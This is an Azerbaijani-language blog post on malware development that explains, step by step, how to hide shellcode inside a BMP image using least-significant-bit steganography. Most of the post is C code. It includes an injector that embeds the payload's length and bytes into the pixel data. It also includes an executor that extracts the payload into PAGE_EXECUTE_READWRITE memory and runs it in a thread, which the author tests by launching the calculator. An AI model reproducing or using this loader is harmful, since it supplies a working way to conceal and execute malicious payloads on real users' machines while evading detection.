---
layout: post
title:  "Bitmap-lar o qədər də məsum deyil"
date:   2024-12-12 22:56:31 +0400
categories: malware-development
tags: [steganography, bitmap, malware-development, payload-hiding, windows]
lang: az
ref: bitmaps
permalink: /malware-development/2024/12/12/bitmaps-are-not-that-innocent.html
description: "Son blog yazımdan xeyli vaxt keçdiyi üçün bu dəfə bir malware metodologiyası haqqında yazmağı planlaşdırırdım. (Söz verirəm, daha tez-tez paylaşacağam)"
canonical_url: "https://medium.com/@Cushz/bitmaps-are-not-that-innocent-6bb90171330c"
---

<figure>
  <img src="/assets/img/bitmaps/1-YTQL6IOK2TM-kl4zRksmLQ.jpeg" alt="screenshot" loading="lazy">
</figure>

Son blog yazımdan xeyli vaxt keçdiyi üçün bu dəfə bir malware metodologiyası haqqında yazmağı planlaşdırırdım. (Söz verirəm, daha tez-tez paylaşacağam)

Addan da təxmin edə biləcəyiniz kimi, söhbət bitmap-lardan gedir. Sadə dillə desək, bitmap sadəcə bir şəkil tipidir. Məsələn, svg və ya jpg faylları görmüsünüz. Amma bitmap-ların fərqi odur ki, onu zoom etdikdə piksel şəklində görürsünüz. Microsoft deyir:

> A bitmap is an array of bits that specify the color of each pixel in a rectangular array of pixels.

<figure>
  <img src="/assets/img/bitmaps/0-q_W3FMWdvZUSuFf4.gif" alt="Bitmap üçün Microsoft sənədlərindəki şəkil" loading="lazy">
  <figcaption>Bitmap üçün Microsoft sənədlərindəki şəkil</figcaption>
</figure>

Bitmap-lar adətən daha realistik şəkillər və qrafika üçün istifadə olunur. Bəs bitmap faylları bizə necə kömək edə bilər? Yaxşı tərəfi odur ki, o, Microsoft tərəfindən yaradılıb və xoşbəxtlikdən, PE faylları kimi BMP faylları üçün də struktur mövcuddur. Bu strukturlar bitmap şəkillərin necə işlədiyini və bu şirin bitmap şəkillərin içinə malware-imizi necə inject edə biləcəyimizi anlamağa kömək edəcək.  
Amma əvvəlcə plan qurmalıyıq:

<figure>
  <img src="/assets/img/bitmaps/1-c1fYOvPuJBFQsXkKlZylYg.png" alt="Injector" loading="lazy">
  <figcaption>Injector</figcaption>
</figure>

Nəzərə almalı olduğumuz 4 əsas addım var:

- Əvvəlcə BMP şəklimizi və shellcode binary-mizi memory-yə oxumalıyıq ki, üzərində dəyişiklik edə bilək.
- Sonra onun BMP faylı olub-olmadığını validate etməliyik. Təfərrüatlar aşağıda müzakirə olunacaq.
- LSB encoding metodu ilə binary-mizi bitmap şəklin içinə inject edəcəyik.
- Nəhayət, dəyişdirilmiş şəkli diskə yazacağıq.

**Addım 1:**

```c
// Read BMP file
if ((hFile = CreateFileW(L"image.bmp", GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("FAILED TO OPEN THE FILE: %d\n", GetLastError());
        return 1;
    }

    // Get BMP file size
if ((nNumberOfBytesToRead = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        printf("FAILED TO GET FILE SIZE: %d\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    // Allocate memory for BMP file
if ((buffer = VirtualAlloc(NULL, nNumberOfBytesToRead, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    // Read BMP file contents
if (ReadFile(hFile, buffer, nNumberOfBytesToRead, &lNumberOfBytesRead, NULL) == 0) {
        printf("FAILED TO READ FILE: %d\n", GetLastError());
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);
    printf("Number of bytes read (FileSize): %d\n", lNumberOfBytesRead);
    printf("Address to the buffer (Base Address): 0x%p\n", buffer);

// Read shellcode file
if ((hFile = CreateFileW(L"example.bin", GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("FAILED TO OPEN THE FILE: %d\n", GetLastError());
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }

    // Get shellcode file size
if ((nNumberOfBytesToReadShell = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        printf("FAILED TO GET FILE SIZE: %d\n", GetLastError());
        CloseHandle(hFile);
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }

    // Allocate memory for shellcode file
if ((Shellbuffer = VirtualAlloc(NULL, nNumberOfBytesToReadShell, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
        printf("Failed to allocate memory: %d\n", GetLastError());
        CloseHandle(hFile);
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }

    // Read shellcode file contents
if (ReadFile(hFile, Shellbuffer, nNumberOfBytesToReadShell, &lNumberOfBytesReadShell, NULL) == 0) {
        printf("FAILED TO READ FILE: %d\n", GetLastError());
        VirtualFree(Shellbuffer, 0, MEM_RELEASE);
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);
    printf("Number of bytes read (FileSize): %d\n", lNumberOfBytesReadShell);
    printf("Address to the buffer (Base Address): 0x%p\n", Shellbuffer);
```

Burada əvvəlcə CreateFile metodundan istifadə edirik ki, handle əldə edək və onu ReadFile-da istifadə edə bilək. (Sənədlərin bizdən istədiyi budur.)  
Sonra GetFileSize metodundan istifadə edirik ki, faylın real ölçüsünü öyrənək və memory allocate etmək üçün VirtualAlloc işlətdiyimizdə dəqiq ölçüyə sahib olaq.

Nəhayət, məzmunu oxumaq üçün ReadFile-dan istifadə edirik.

**Qeyd:** Bu kod effektiv deyil, çünki diskdən fayl oxuyan ayrıca bir function yarada bilərdik.

**Addım 2:**

```c
//Validate BMP
LPBITMAPFILEHEADER hdr = (LPBITMAPFILEHEADER)buffer;
    printf("%x\n", hdr->bfType);
    if (hdr->bfType != 0x4D42) {
        printf("INVALID BMP FILE\n");
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }
```

Addım 1-dən fayl məzmununu “buffer” dəyişənində əldə etdik, elə deyilmi? İndi onun strukturundan istifadə etmək üçün LPBITMAPFILEHEADER işlətməliyik.

<figure>
  <img src="/assets/img/bitmaps/1-pTr8GxT3Zv2a_YdOJttvIg.png" alt="BITMAPFILEHEADER strukturu — Microsoft sənədləri" loading="lazy">
  <figcaption>BITMAPFILEHEADER strukturu — Microsoft sənədləri</figcaption>
</figure>

İndi bilirik ki, əgər o, 0x4d42-yə bərabərdirsə, deməli bu, həqiqi BMP faylıdır.

**Addım 3:**

LSB metodu qısa mövzu deyil, ona görə də ondan giriş səviyyəsində danışacağam. Daha ətraflı məlumat üçün istinadlar siyahısına baxa bilərsiniz.

LSB (Least significant bit) binary-də ən sağdakı dəyərdir və biz şəklin piksel datasının LSB-sini encode edilmiş binary dəyərimizlə dəyişəcəyik ki, payload-umuz şəkil datasının içində bayt-bayt gizlənsin. Əvvəlcə onun uzunluğunu, sonra isə datanı bayt-bayt encode edirik. Payload uzunluğunu niyə encode etdiyimizi soruşa bilərsiniz. Cavab budur: decode edərkən əvvəlcə uzunluğu çıxaracaq və bu, embed edilmiş datanı çıxarmaq üçün bizim üçün həlledici elementdir.

Amma əvvəlcə şəklin datasına çatmalıyıq. Ona görə də ilk növbədə BMP şəklin strukturuna baxmalıyıq.

<figure>
  <img src="/assets/img/bitmaps/0-2AuFGlSw4k5x09ae.gif" alt="paulborke.net" loading="lazy">
  <figcaption>paulborke.net</figcaption>
</figure>

Bu strukturu analiz etdikdən sonra qərara gəlirik ki, offset şəkil datasından başlamalıdır. Ona görə də header, info header və əlavə 1024 baytın (padding və ya opsional palet üçün deyə bilərik) ölçülərini toplayırıq ki, şəkil datasına çata bilək.

```c
//This function loops through all 32 bits of the "Data"
ULONG StegoHideInt32(IN PVOID BmpImage, IN ULONG Offset, IN ULONG Data) {
    BYTE Char = {0};

    for (int i = (sizeof(ULONG) * 8) - 1; i >= 0; i--) {
        Char = *(PBYTE)(U_PTR(BmpImage) + Offset);

        // Clear the LSB and encode one bit from the data
        Char &= 0xFE;
        Char |= ((Data >> i) & 1);

        *(PBYTE)(U_PTR(BmpImage) + Offset) = Char;
        Offset += sizeof(BYTE);
    }

    return Offset;
}

//Used to encode single BYTE of data into the LSB of the Image's pixel data.
ULONG StegoHideChar(IN PVOID BmpImage, IN ULONG Offset, IN BYTE Data) {
    BYTE Char = {0};

    for (int i = 7; i >= 0; i--) {
        Char = *(PBYTE)(U_PTR(BmpImage) + Offset);

        // Clear the LSB and encode one bit from the data
        Char &= 0xFE;
        Char |= ((Data >> i) & 1);

        *(PBYTE)(U_PTR(BmpImage) + Offset) = Char;
        Offset += sizeof(BYTE);
    }

    return Offset;
}

// Hide payload inside BMP
    ULONG Offset = hdr->bfOffBits; // Start of pixel array
    Offset = StegoHideInt32(buffer, Offset, lNumberOfBytesReadShell);

    for (ULONG i = 0; i < lNumberOfBytesReadShell; i++) {
        Offset = StegoHideChar(buffer, Offset, ((BYTE *)Shellbuffer)[i]);
    }
```

> The human eye can distinguish about 10 million different colours, which means that the human eye can’t distinguish the remaining 6 million colours. LSB steganography is to modify the lowest binary bit (LSB) of RGB colour components, each colour will have 8 bits, LSB steganography is to modify the lowest bit in the number of pixels, and human eyes will not notice before and after this change, each pixel can carry 3 bits of information.

**Addım 4:**

Dəyişdirilmiş şəkil faylını yenidən diskə yazmaq üçün sadəcə WriteFile function-undan istifadə edə bilərik.

```c
// Write image to the disk
if ((hFile = CreateFileA("image.bmp", GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
        return 0;
    }

    if (!WriteFile(hFile, buffer, nNumberOfBytesToRead, &lNumberOfBytesRead, NULL)) {
        printf("[!] WriteFile Failed With Error: %d \n", GetLastError());
        return 0;
    }
```

İndi gəlin injector kodumuzu işlədək və nə baş verdiyinə baxaq.

<figure>
  <img src="/assets/img/bitmaps/1-vhrHgw7Q-C5TS6HMyNvJjA.png" alt="screenshot" loading="lazy">
</figure>

Görürük ki, file header düzgündür, bmp faylının və bin faylının ölçüsü düzgündür və memory-yə uğurla yazılıb.

Onu execute etmək üçün oxşar məntiqdən istifadə edəcəyik.

<figure>
  <img src="/assets/img/bitmaps/1-g4NcLAb2j-y-bYz8woyj2g.png" alt="Executor.c" loading="lazy">
  <figcaption>Executor.c</figcaption>
</figure>

Burada da məntiq eynidir. Yeganə fərq odur ki, burada payload-umuz üçün memory allocate edib sonra onu çıxarırıq. Həmçinin PAYLOAD ÜÇÜN process-in İÇƏRİSİNDƏ memory allocate edirik.  
Nəhayət, payload-umuzu ilkin memory-dən process-ə kopyalayırıq.  
Sonra isə process-i işlətmək üçün bir thread yaradırıq.

**Bu memory köçürmə addımlarının kodu:**

```c
// Extract payload size
    ULONG Offset = hdr->bfOffBits; // Start of pixel array
    ULONG PayloadSize = ExtractInt32(buffer, Offset);
    Offset += sizeof(ULONG) * 8;

    printf("Payload size: %lu bytes\n", PayloadSize);

    // Allocate memory for the payload
    PVOID PayloadBuffer = VirtualAlloc(NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (PayloadBuffer == NULL) {
        printf("Failed to allocate memory for payload: %d\n", GetLastError());
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 1;
    }

    // Extract payload
for (ULONG i = 0; i < PayloadSize; i++) {
        ((BYTE *)PayloadBuffer)[i] = ExtractChar(buffer, Offset);
        Offset += 8;
    }

    // Allocate memory in the current process for the payload
    LPVOID execMemory = VirtualAlloc(NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == NULL) {
        printf("FAILED TO ALLOCATE MEMORY: %d\n", GetLastError());
        return 1;
    }

    // Copy the payload to the allocated memory
memcpy(execMemory, PayloadBuffer, PayloadSize);
```

**Yekun test və nəticə:**  
Testimiz üçün binary faylımızı şəklimizə inject etmək məqsədilə injector.c-ni işlədəcəyik.  
Sonra isə kalkulyatorun (bizim binary) açılıb-açılmadığını görmək üçün executor.c-ni işlədəcəyik.

<figure>
  <img src="/assets/img/bitmaps/1-DU_OhQiYIlPgrM1aj7bb3Q.png" alt="Execution testi" loading="lazy">
  <figcaption>Execution testi</figcaption>
</figure>

Kodu [github](https://github.com/Cushz/malware-development-exercises/tree/main/challenges/BitmapStego) səhifəmdən yükləyib özünüz test edə bilərsiniz.

**İstinadlar:**  
[https://paulbourke.net/dataformats/bmp/](https://paulbourke.net/dataformats/bmp/)

> [**LSB Encoding - bi0s wiki**](https://wiki.bi0s.in/forensics/lsb/)  
> What is LSB ? LSB, the least significant bit is the lowest bit in a series of numbers in binary; which is located at…

[https://learn.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader](https://learn.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader)
